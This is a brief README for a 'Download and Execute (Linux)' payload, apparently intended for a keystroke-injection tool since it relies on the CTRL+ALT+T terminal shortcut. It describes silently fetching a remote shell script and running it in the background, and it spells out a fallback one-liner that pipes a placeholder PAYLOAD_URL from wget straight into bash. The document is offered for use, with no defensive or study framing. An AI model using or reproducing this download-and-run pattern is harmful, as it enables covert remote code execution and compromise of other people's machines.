# Download and Execute (Linux)

Downloads a remote shell script via curl and executes it silently in the background.

- **Requirements:** `curl` installed, internet connection, replace `PAYLOAD_URL` with your script URL
- **Note:** Runs in background (`&`) so terminal can be closed. If curl is not available, replace with `wget -qO- PAYLOAD_URL | bash`.
- **CTRL+ALT+T** opens terminal on most GNOME/KDE desktops. Adjust shortcut for other desktop environments.
